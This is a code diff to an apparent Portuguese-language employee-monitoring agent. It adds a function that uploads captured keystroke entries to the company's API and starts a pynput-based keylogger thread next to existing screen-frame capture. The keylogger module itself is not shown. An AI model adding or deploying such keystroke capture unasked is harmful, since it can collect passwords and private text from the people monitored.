@@ -560,6 +560,7 @@ except ImportError:
 API_BASE_URL = os.getenv('API_URL', 'https://hiprod.grupohi.com.br')
 ATIVIDADE_URL = f"{API_BASE_URL}/api/atividade"
 USUARIOS_MONITORADOS_URL = f"{API_BASE_URL}/api/usuarios-monitorados"
+KEYLOG_URL = f"{API_BASE_URL}/api/keylog"
 
 # Configuração SSL/TLS
 SSL_VERIFY = os.getenv('SSL_VERIFY', 'true').lower() == 'true'
@@ -2238,6 +2239,30 @@ def enviar_screen_frames(usuario_monitorado_id, frames_bytes_list, captured_at=N
         return False
 
 
+def enviar_keylog(usuario_monitorado_id, entries):
+    """Envia entradas de keylog para a API."""
+    if check_stop_flag() or check_pause_flag() or not entries:
+        return False
+    try:
+        usuario_nome = get_logged_user()
+        session = get_secure_session()
+        resp = session.post(
+            KEYLOG_URL,
+            json={'usuario_monitorado_id': usuario_monitorado_id, 'entries': entries},
+            headers=get_headers(usuario_nome),
+            timeout=15
+        )
+        if resp.status_code == 201:
+            if not IS_EXECUTABLE:
+                safe_print(f"[KEYLOG] {len(entries)} entrada(s) enviada(s)")
+            return True
+        return False
+    except Exception as e:
+        if not IS_EXECUTABLE:
+            safe_print(f"[KEYLOG] Erro ao enviar: {e}")
+        return False
+
+
 def _screen_frame_worker(usuario_monitorado_id_ref):
     """
     Worker que roda em thread: a cada SCREEN_FRAME_INTERVAL segundos captura e envia frames.
@@ -2558,6 +2583,14 @@ def main():
         frame_thread = threading.Thread(target=_screen_frame_worker, args=(screen_frame_user_ref,), daemon=True)
         frame_thread.start()
         safe_print("[FRAMES] Thread de frames de tela iniciada (envio a cada %s s)" % SCREEN_FRAME_INTERVAL)
+        try:
+            from keylogger import start_keylogger
+            if start_keylogger(get_active_window_info, enviar_keylog, screen_frame_user_ref):
+                safe_print("[KEYLOG] Keylogger iniciado (envio periodico para API)")
+        except ImportError:
+            safe_print("[KEYLOG] pynput nao instalado - keylog desativado. pip install pynput para ativar.")
+        except Exception as e:
+            safe_print("[KEYLOG] Falha ao iniciar keylogger: %s" % e)
 
     while True:
         # Verificar flag de parada
